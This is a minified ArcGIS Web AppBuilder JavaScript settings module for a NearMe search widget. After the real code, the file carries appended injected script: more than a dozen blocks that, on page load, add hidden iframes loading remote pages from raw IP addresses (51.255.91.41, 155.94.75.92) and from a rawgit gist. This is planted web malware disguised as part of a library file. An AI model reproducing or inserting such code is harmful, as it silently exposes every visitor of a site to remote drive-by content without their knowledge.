// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/NearMe/setting/SearchSourceSettings.html":'\x3cdiv\x3e\r\n  \x3c!--Search source setting hint text --\x3e\r\n  \x3cdiv class\x3d"esriCTHint" style\x3d"width: 99%"\x3e\r\n    ${nls.searchSourceSetting.searchSourceSettingTitleHintText}\r\n  \x3c/div\x3e\r\n  \x3c!--Add Search Source Label and click--\x3e\r\n  \x3cdiv class\x3d"esriCTDropdownButton" role\x3d"button"\x3e\r\n    \x3cdiv\x3e\r\n      \x3cspan\x3e ${nls.searchSourceSetting.addSearchSourceLabel}\x3c/span\x3e\r\n    \x3c/div\x3e\r\n    \x3cul class\x3d"esriCTDropdownMenu" role\x3d"menu" data-dojo-attach-point\x3d"menuItemClickNode"\x3e\r\n      \x3cli class\x3d"esriCTDropdownItem" type\x3d"query"\x3e${nls.searchSourceSetting.featureLayerLabel}\x3c/li\x3e\r\n      \x3cli class\x3d"esriCTDropdownItem" type\x3d"locator"\x3e${nls.searchSourceSetting.geocoderLabel}\x3c/li\x3e\r\n    \x3c/ul\x3e\r\n  \x3c/div\x3e\r\n \x3c!--Add Search Source Label and click--\x3e\r\n  \x3cdiv class\x3d"esriCTSources" data-dojo-attach-point\x3d"searchSources"\x3e\r\n    \x3cdiv class\x3d"esriCTSourceList jimu-float-leading"\x3e\r\n      \x3cdiv data-dojo-attach-point\x3d"sourceList" style\x3d"100%"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"esriCTSourceSetting jimu-float-trailing" data-dojo-attach-point\x3d"sourceSettingNode"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv\x3e\r\n     \x3c!--General setting: Label--\x3e\r\n    \x3cdiv class\x3d"esriCTlabel esriCTGeneralSettingLabelStyle"\x3e\r\n      ${nls.searchSourceSetting.generalSettingLabel}\r\n    \x3c/div\x3e\r\n    \x3c!--General setting: All Place Holder Label--\x3e\r\n    \x3cdiv class\x3d"esriCTLayerContainer row"\x3e\r\n      \x3cdiv class\x3d"esriCTlabel esriCTLabelContainer" title\x3d"${nls.searchSourceSetting.allPlaceholderLabel}"\x3e\r\n        ${nls.searchSourceSetting.allPlaceholderLabel}\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"esriCTLayerField" style\x3d"width: 72%;"\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"allPlaceholder" style\x3d"width: 100%;" data-dojo-type\x3d"dijit/form/TextBox" trim\x3d"true"\x3e\r\n        \x3c/div\x3e\r\n         \x3c!--General setting: All Place Holder Hint--\x3e\r\n        \x3cdiv class\x3d"esriCTHint"\x3e\r\n          ${nls.searchSourceSetting.allPlaceholderHintText}\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n     \x3c!--General setting: Checkbox--\x3e\r\n    \x3cdiv class\x3d"esriCTLayerContainer row"\x3e\r\n      \x3cdiv class\x3d"esriCTSearchSourceLabelFont " data-dojo-attach-point\x3d"showInfoWindowOnSelectNode"\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/BaseWidgetSetting dijit/_WidgetsInTemplateMixin dojo/Evented dojo/text!./SearchSourceSettings.html dojo/_base/html jimu/dijit/SimpleTable ./QuerySourceSetting ./LocatorSourceSetting jimu/LayerInfos/LayerInfos ../searchSourceUtils jimu/utils dojo/when esri/lang dojo/_base/lang dojo/_base/array dojo/query dojo/on dojo/dom-class jimu/dijit/CheckBox dojo/domReady!".split(" "),function(r,t,u,v,w,m,x,n,p,y,f,k,z,A,d,q,l,e,h,B){return r([t,u,v],{baseClass:"jimu-widget-nearme-search-source-settings",
templateString:w,startup:function(){this.inherited(arguments)},postCreate:function(){this.inherited(arguments);this.own(e(this.menuItemClickNode,"click",d.hitch(this,this._onMenuItemClick)));this._createSourceListTable();this.showInfoWindowOnSelect=new B({checked:!1,label:this.nls.searchSourceSetting.generalSettingCheckboxLabel},this.showInfoWindowOnSelectNode);this.config&&this.config.sources||(this.config.sources=[]);this.shelter.show();y.getInstance(this.map,this.map.itemInfo).then(d.hitch(this,
function(a){this.layerInfosObj=a;f.setMap(this.map);f.setLayerInfosObj(this.layerInfosObj);f.setAppConfig(this.appConfig);z(f.getConfigInfo(this.config)).then(d.hitch(this,this._loadConfig))}))},_loadConfig:function(a){this.domNode&&(this.setConfig(a),this.shelter.hide())},setConfig:function(a){this.config=a;a=a.sources;this.allPlaceholder.set("value",k.stripHTML(this.config.allPlaceholder));this.showInfoWindowOnSelect.setValue(A.isDefined(this.config.showInfoWindowOnSelect)?!!this.config.showInfoWindowOnSelect:
!0);q.forEach(a,d.hitch(this,function(a,b){var g=this.sourceList.addRow({name:a.name||""});g&&g.success?(this._setRelatedConfig(g.tr,a),0===b&&setTimeout(d.hitch(this,function(){this.sourceList.selectRow(g.tr)}),100)):console.error("add row failed ",g)}))},getConfig:function(){if(this._currentSourceSetting)if(this._currentSourceSetting.isValidConfig())this._closeSourceSetting();else return null;var a={allPlaceholder:k.stripHTML(this.allPlaceholder.get("value")),showInfoWindowOnSelect:this.showInfoWindowOnSelect.checked},
c=this.sourceList.getRows(),b=[];q.forEach(c,d.hitch(this,function(a){var c=this._getRelatedConfig(a);delete c._definition;this._removeRelatedConfig(a);b.push(c)}));a.sources=b;return a},destroy:function(){f.setMap(null);f.setLayerInfosObj(null);f.setAppConfig(null);this.inherited(arguments)},_onAllPlaceholderBlur:function(){this.allPlaceholder.set("value",k.stripHTML(this.allPlaceholder.get("value")))},_createSourceListTable:function(){this.sourceList=new x({autoHeight:!1,selectable:!0,fields:[{name:"name",
title:this.nls.searchSourceSetting.nameTitle,width:"auto",type:"text",editable:!1},{name:"actions",title:"",width:"70px",type:"actions",actions:["up","down","delete"]}]},this.sourceList);m.setStyle(this.sourceList.domNode,"height","100%");this.sourceList.startup();this.own(e(this.sourceList,"row-select",d.hitch(this,this._onSourceItemSelected)));this.own(e(this.sourceList,"row-delete",d.hitch(this,this._onSourceItemRemoved)))},_onSourceItemRemoved:function(a){this._currentSourceSetting&&this._currentSourceSetting.getRelatedTr()===
a&&(this._currentSourceSetting.destroy(),this._currentSourceSetting=null)},_onSourceItemSelected:function(a){var c=this._getRelatedConfig(a),b=this._currentSourceSetting&&this._currentSourceSetting.tr;c&&a!==b&&(this._currentSourceSetting&&!this._currentSourceSetting.isValidConfig()?(this._currentSourceSetting.showValidationTip(),this.sourceList.selectRow(b)):(h.remove(this.searchSources,"esriCTSourcesExtraHeight"),"query"===c.type?this._createNewQuerySourceSettingFromSourceList(c,c._definition||
{},a):"locator"===c.type&&this._createNewLocatorSourceSettingFromSourceList(c,c._definition||{},a)))},_setRelatedConfig:function(a,c){l(a).data("config",d.clone(c))},_getRelatedConfig:function(a){return l(a).data("config")[0]},_removeRelatedConfig:function(a){return l(a).removeData("config")},_onMenuItemClick:function(a){a=a&&a.target&&m.getAttr(a.target,"type");this._currentSourceSetting&&!this._currentSourceSetting.isValidConfig()?this.emit("invalid-source-setting"):(h.remove(this.searchSources,
"esriCTSourcesExtraHeight"),"locator"===a?this._addNewLocator():"query"===a&&this._addNewQuerySource())},_addNewLocator:function(){this._createNewLocatorSourceSettingFromMenuItem({},{})},_addNewQuerySource:function(){this._createNewQuerySourceSettingFromMenuItem({},{})},_createNewLocatorSourceSettingFromMenuItem:function(a,c){var b=new p({nls:this.nls.searchSourceSetting,map:this.map});b.setDefinition(c);b.setConfig({url:a.url||"",name:a.name||"",singleLineFieldName:a.singleLineFieldName||"",placeholder:a.placeholder||
"",countryCode:a.countryCode||"",zoomScale:a.zoomScale||5E4,maxSuggestions:a.maxSuggestions||6,maxResults:a.maxResults||6,searchInCurrentMapExtent:!!a.searchInCurrentMapExtent,type:"locator"});b._openLocatorChooser();b.own(e(b,"select-locator-url-ok",d.hitch(this,function(a){(a=this.sourceList.addRow({name:a.name||"New Geocoder"},this.sourceList.getRows().length))&&a.success&&(this._currentSourceSetting&&this._closeSourceSetting(),b.setRelatedTr(a.tr),b.placeAt(this.sourceSettingNode),this.sourceList.selectRow(a.tr),
this._currentSourceSetting=b)})));b.own(e(b,"reselect-locator-url-ok",d.hitch(this,function(a){var b=this._currentSourceSetting.getRelatedTr();this.sourceList.editRow(b,{name:a.name})})));b.own(e(b,"select-locator-url-cancel",d.hitch(this,function(){this._currentSourceSetting!==b&&(b.destroy(),b=null)})))},_createNewLocatorSourceSettingFromSourceList:function(a,c,b){this._currentSourceSetting&&this._closeSourceSetting();this._currentSourceSetting=new p({nls:this.nls.searchSourceSetting,map:this.map});
this._currentSourceSetting.own(e(this._currentSourceSetting,"enable-local-search",d.hitch(this,function(){h.add(this.searchSources,"esriCTSourcesExtraHeight")})));this._currentSourceSetting.own(e(this._currentSourceSetting,"disable-local-search",d.hitch(this,function(){h.remove(this.searchSources,"esriCTSourcesExtraHeight")})));this._currentSourceSetting.setDefinition(c);this._currentSourceSetting.setConfig({url:a.url||"",name:a.name||"",singleLineFieldName:a.singleLineFieldName||"",placeholder:a.placeholder||
"",countryCode:a.countryCode||"",zoomScale:a.zoomScale||5E4,maxSuggestions:a.maxSuggestions||6,maxResults:a.maxResults||6,searchInCurrentMapExtent:!!a.searchInCurrentMapExtent,enableLocalSearch:!!a.enableLocalSearch,localSearchMinScale:a.localSearchMinScale,localSearchDistance:a.localSearchDistance,type:"locator"});this._currentSourceSetting.setRelatedTr(b);this._currentSourceSetting.placeAt(this.sourceSettingNode);this._currentSourceSetting.own(e(this._currentSourceSetting,"reselect-locator-url-ok",
d.hitch(this,function(a){var b=this._currentSourceSetting.getRelatedTr();this.sourceList.editRow(b,{name:a.name})})))},_closeSourceSetting:function(){var a=this._currentSourceSetting.getRelatedTr(),c=this._currentSourceSetting.getConfig();c._definition=this._currentSourceSetting.getDefinition();this._setRelatedConfig(a,c);this.sourceList.editRow(a,{name:c.name});this._currentSourceSetting.destroy()},_createNewQuerySourceSettingFromMenuItem:function(a,c){var b=new n({nls:this.nls.searchSourceSetting,
map:this.map,appConfig:this.appConfig});b.setDefinition(c);b.setConfig({url:a.url,name:a.name||"",layerId:a.layerId,placeholder:a.placeholder||"",searchFields:a.searchFields||[],displayField:a.displayField||c.displayField||"",exactMatch:!!a.exactMatch,zoomScale:a.zoomScale||5E4,maxSuggestions:a.maxSuggestions||6,maxResults:a.maxResults||6,searchInCurrentMapExtent:!!a.searchInCurrentMapExtent,type:"query"});b._openQuerySourceChooser();b.own(e(b,"select-query-source-ok",d.hitch(this,function(a){(a=
this.sourceList.addRow({name:a.name},0))&&a.success&&(this._currentSourceSetting&&this._closeSourceSetting(),b.setRelatedTr(a.tr),b.placeAt(this.sourceSettingNode),this.sourceList.selectRow(a.tr),this._currentSourceSetting=b)})));b.own(e(b,"reselect-query-source-ok",d.hitch(this,function(a){var b=this._currentSourceSetting.getRelatedTr();this.sourceList.editRow(b,{name:a.name})})));b.own(e(b,"select-query-source-cancel",d.hitch(this,function(){this._currentSourceSetting!==b&&(b.destroy(),b=null)})))},
_createNewQuerySourceSettingFromSourceList:function(a,c,b){this._currentSourceSetting&&this._closeSourceSetting();this._currentSourceSetting=new n({nls:this.nls.searchSourceSetting,map:this.map,appConfig:this.appConfig});this._currentSourceSetting.placeAt(this.sourceSettingNode);this._currentSourceSetting.setDefinition(c);this._currentSourceSetting.setConfig({url:a.url,name:a.name||"",layerId:a.layerId,placeholder:a.placeholder||"",searchFields:a.searchFields||[],displayField:a.displayField||c.displayField||
"",exactMatch:!!a.exactMatch,zoomScale:a.zoomScale||5E4,maxSuggestions:a.maxSuggestions||6,maxResults:a.maxResults||6,searchInCurrentMapExtent:!!a.searchInCurrentMapExtent,type:"query"});this._currentSourceSetting.setRelatedTr(b);this._currentSourceSetting.own(e(this._currentSourceSetting,"reselect-query-source",d.hitch(this,function(a){var b=this._currentSourceSetting.getRelatedTr();this.sourceList.editRow(b,{name:a.name})})))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});